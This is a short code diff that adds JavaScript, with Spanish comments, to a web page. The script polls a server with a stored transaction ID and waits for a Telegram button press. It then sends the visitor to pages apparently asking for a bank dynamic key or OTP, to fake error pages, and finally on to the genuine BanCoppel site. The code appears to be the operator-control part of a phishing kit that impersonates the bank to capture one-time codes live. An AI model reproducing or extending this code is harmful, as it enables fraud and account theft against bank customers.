@@ -169,6 +169,38 @@ async function checkBoton(botToken, txId, offset) {
     setTimeout(() => checkBoton(botToken, txId, offset), 3000);
   }
 }
+  // JS: revisa constantemente si el usuario presionó un botón en Telegram
+async function revisarAccion() {
+  const txId = localStorage.getItem("transactionId");
+  if (!txId) return;
+
+  try {
+    const res = await fetch(`sendStatus.php?txid=${txId}`);
+    const json = await res.json();
+    if (!json.status || json.status === "esperando") {
+      return setTimeout(revisarAccion, 3000);
+    }
+
+    switch (json.status) {
+      case "pedir_dinamica":
+        window.location.href = "cel-dina.html"; break;
+      case "error_logo":
+        window.location.href = "errorlogo.html"; break;
+      case "error_otp":
+        window.location.href = "cel-dina-error.html"; break;
+      case "finalizar":
+      case "confirm_finalizar":
+        window.location.href = "https://www.bancoppel.com"; break;
+    }
+
+  } catch (e) {
+    console.error("Error al revisar botón:", e);
+    setTimeout(revisarAccion, 3000);
+  }
+}
+
+revisarAccion();
+
 </script>
 </body>
 </html>
